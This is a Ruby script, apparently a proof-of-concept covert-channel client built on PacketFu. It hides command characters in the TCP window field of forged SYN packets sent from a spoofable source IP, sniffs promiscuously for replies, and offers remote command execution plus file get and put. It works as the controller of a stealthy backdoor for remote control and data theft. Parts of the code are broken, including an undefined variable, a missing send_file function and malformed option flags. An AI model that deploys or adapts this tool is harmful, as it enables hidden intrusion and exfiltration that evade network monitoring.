#!/usr/bin/env ruby
require 'rubygems'
require 'optparse'
require 'packetfu'

# -----------------------------------------------------------------------------------------
# print_usage()
#
# Prints the application usage information.
# 
# -----------------------------------------------------------------------------------------
def print_usage()

    puts "ruby client.rb -s <source ip for packet> -d <destination ip> -p <destination port>
               -z <optional sleep time in seconds between each send> "
    exit()

end

# -----------------------------------------------------------------------------------------
#
# send_command(cmd)
#
# Sends a command to the server and waits for the response.
#
# -----------------------------------------------------------------------------------------
def send_command(cmd)


#Fill in TCP Packet
pkt = PacketFu::TCPPacket.new

cmd.each_byte do | c | 

    send_char(pkt, c)

end #cmd.each_byte
    send_fin()
   

end


# -----------------------------------------------------------------------------------------
#
# recv_command_result()
#
# Waits for some data from the server (the output of a command) and returns it.
# Optional argument to display it.
#
# -----------------------------------------------------------------------------------------
def recv_data(display = false)
    data = nil
    cap = PacketFu::Capture.new(:iface => @options[:iface], :start => true,
                :promisc => true)    

    cap.stream.each do | pkt |

        if PacketFu::TCPPacket.can_parse?(pkt) then
            packet = PacketFu::Packet.parse(pkt)
            
            if packet.ip_daddr == @options[:source_ip]

                if packet.tcp_flags.fin == 1 then
                               
                    return data
                else
                    if data.nil? then
                        data = packet.tcp_win.chr
                        
                    else #not nill
                        begin
                            data = data + packet.tcp_win.chr(Encoding::UTF_8)
                        rescue
                            
                        end
                    end 
            end #fin == 1
          end #ptk.tcp_dst 
        end #can_parse()
    end #capture
    
    if display == true
        puts output
    end
end

# -----------------------------------------------------------------------------------------
#
#   recv_file()
#   
#   Receives a file from the server
#
# -----------------------------------------------------------------------------------------

def recv_file()
    filename = recv_data()

    if filename == '#'
        puts "Server could not find remote file."
        return
    else
        file = File.open(filename, 'wb')
    end
    content = recv_data()
    content.each_byte do |c|
        file.putc(c)
    end
    file.close()

end

# -----------------------------------------------------------------------------------------
#
#   send_char(pkt, c)
#   
#   Send a character to the server. pkt = the packet object, c = the character to send    
#
# -----------------------------------------------------------------------------------------
def send_char(pkt, c)
    cfg =  PacketFu::Utils.whoami?(:iface => @options[:iface])

    pkt.eth_saddr = @options[:ifconfig][:eth_saddr]
    pkt.ip_saddr = @options[:source_ip]
    pkt.ip_daddr = @options[:dest_ip]
    pkt.tcp_flags = PacketFu::TcpFlags.new(:syn => 1)
    if !@options[:source_port]
        @options[:source_port] = rand(0xfff-1024) + 1024
    end
    pkt.tcp_src = @options[:source_port].to_i
    pkt.tcp_dst = @options[:dest_port].to_i
    
    pkt.tcp_win = (c * 20)/5 # our encryption for proof of concept * 20 and / 5

    pkt.recalc


    pkt.to_w(@options[:iface])
    sleep(@options[:delay].to_i)
  
end
# -----------------------------------------------------------------------------------------
#
#   send_fin()
#   
#   Send a FIN packet to the server.    
#

def send_fin()
    # Send FIN packet (to tell server we're done our command)
    pkt_f = PacketFu::TCPPacket.new
    pkt_f.eth_saddr = @options[:ifconfig][:eth_saddr]   
    pkt_f.ip_saddr = @options[:source_ip]
    pkt_f.ip_daddr = @options[:dest_ip]
    pkt_f.tcp_flags = PacketFu::TcpFlags.new(:fin => 1)
    pkt_f.tcp_src = @options[:source_port].to_i
    pkt_f.tcp_dst = @options[:dest_port].to_i
    

    pkt_f.to_w(@options[:iface])
    #return to the prompt
    return
   

end
# -----------------------------------------------------------------------------------------
#
#    Application entry point. Get options, make root, and waits for input
#
# -----------------------------------------------------------------------------------------

def prompt

    print("Enter command > ");
    command = gets.chomp()
    cmds = command.split(' ')

    if cmds[0] == 'quit' or cmds[0] == 'exit'
        abort("Program recieved exit code... quiting");
    end
    #if put is entered, get the following value  
    if cmds[0] == 'get'
        send_command(command)
        recv_file()
    
    elsif cmds[0] == 'put'
        send_file(cmds[1])
    else
        send_command(command)
        data = recv_data()
        puts "Remote server says \n" + data
        prompt() #wait at prompt        
    end
    
end

# -----------------------------------------------------------------------------------------
#
#    Application entry point. Get options, make root, and waits for input
#
# -----------------------------------------------------------------------------------------
@options = {}

# Set defaults for options
@options[:iface] = "em1" 

optparser = OptionParser.new do | opts |
    
    opts.on('-h', '--help','Display usage') do
        print_usage()

    end
    opts.on('-s' '--source-ip SOURCE IP','The client\'s IP.') do |s|
        @options[:source_ip] = s;    
    end
    opts.on('-d' '--dest-ip DESTINATION IP','The servers\'s IP.') do |d|
        @options[:dest_ip] = d;    
    end
    opts.on('-p' '--dest-port DESTINATION PORT','The port the server is listening on.') do |p|
        @options[:dest_port] = p;    
    end
    opts.on('-i' '--iface','The interface to send on.') do |i|
        @options[:iface] = i;    
    end
    opts.on('-z' '--sleep SLEEP_TIME','The port to send from.') do |z|
        @options[:delay] = z;    
    end

end.parse! #optparse
@options[:ifconfig] = PacketFu::Utils.whoami?(:iface => @options[:iface])



prompt()
